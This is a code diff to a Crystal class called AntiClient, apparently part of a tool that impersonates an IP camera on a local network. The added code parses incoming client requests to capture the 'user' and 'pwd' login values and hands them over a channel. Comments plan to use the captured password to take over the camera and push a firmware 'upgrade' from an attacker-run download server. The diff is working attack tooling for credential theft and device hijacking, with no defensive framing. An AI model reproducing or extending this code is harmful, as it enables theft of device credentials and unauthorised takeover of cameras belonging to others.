@@ -17,6 +17,8 @@ class AntiClient < Client
 
   getter camera = Socket::IPAddress.new("0.0.0.0", 0)
 
+
+  @creds_channel : Channel(Hash(Symbol, String)) = Channel(Hash(Symbol, String)).new
   @spam_dbr = false
 
   def run
@@ -78,6 +80,7 @@ class AntiClient < Client
           sleep 0.000001
         rescue e
           LOG.info "SPAM DBR EXCEPTION #{e}"
+          @spam_dbr = false
         end
       end
       LOG.info "Spamming DBR Finished!"
@@ -116,7 +119,7 @@ class AntiClient < Client
 
     timeout_fiber = spawn do
       sleep timeout
-      unblock_data
+      unblock_data if is_running?
     end
 
     got_ping = ping_channel.receive
@@ -128,6 +131,7 @@ class AntiClient < Client
     got_ping
   end
 
+  # TODO: Rename to "wait_for_password" and add a disconnect when password is found.
   def main_phase
     # Block here to receive data from the data fiber
     data = @data_channel.receive
@@ -148,6 +152,13 @@ class AntiClient < Client
       LOG.info "REQUEST RECEIVED FROM CLIENT #{data[0].size}"   
       LOG.info "\n" + data[0][0x10..data[0].size]
       send_reply
+
+      creds = {} of Symbol => String
+      parsed = HTTP::Params.parse(data[0][0x10..data[0].size].split('?')[1])
+      puts parsed
+      creds[:user] = parsed["user"]
+      creds[:pass] = parsed["pwd"]
+      @creds_channel.send(creds)
     # This is important! The data fiber will block, waiting for data to come through
     # So to exit the program, we just send the unblock data to the data socket to free it
     elsif data[0] == UNBLOCK_FIBER_DATA
@@ -156,6 +167,13 @@ class AntiClient < Client
       LOG.info "UNKNOWN PACKET RECEIVED from #{data[1]} : #{data[0].bytes.map {|d| d.to_s(16).rjust(2, '0')}.join("\\x")}"
     end
   end
+
+  def wait_for_creds
+    @creds_channel.receive
+  end
+
+  # TODO: Once we get password, target the camera, revert back to a client, and use auto_download to upgrade firmware.
+  # Need to start fiber for download server (HTTP)
 
   def tick
     if state == :nothing
